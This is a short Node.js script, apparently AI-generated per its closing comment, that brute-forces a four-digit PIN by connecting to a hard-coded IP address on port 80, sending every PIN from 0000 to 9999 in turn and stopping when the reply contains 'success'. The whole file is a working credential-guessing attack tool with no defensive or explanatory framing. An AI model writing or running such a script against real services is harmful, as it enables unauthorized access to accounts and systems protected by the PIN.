import net from "net";

const host = "6.3.5.2";
const port = 80;

function tryPin(pin) {
  return new Promise((resolve, reject) => {
    const client = new net.Socket();
    client.connect(port, host, () => {
      console.log(`Trying PIN: ${pin}`);
      client.write(pin + "\n");
    });

    client.on("data", (data) => {
      const response = data.toString();
      if (response.includes("success")) {
        console.log(`Found correct PIN: ${pin}`);
        resolve(true);
      } else {
        resolve(false);
      }
      client.destroy();
    });

    client.on("error", (err) => {
      reject(err);
    });
  });
}

async function bruteForce() {
  for (let i = 0; i <= 9999; i++) {
    const pin = i.toString().padStart(4, "0");
    const success = await tryPin(pin);
    if (success) break;
  }
}

bruteForce();
//all ai generate code
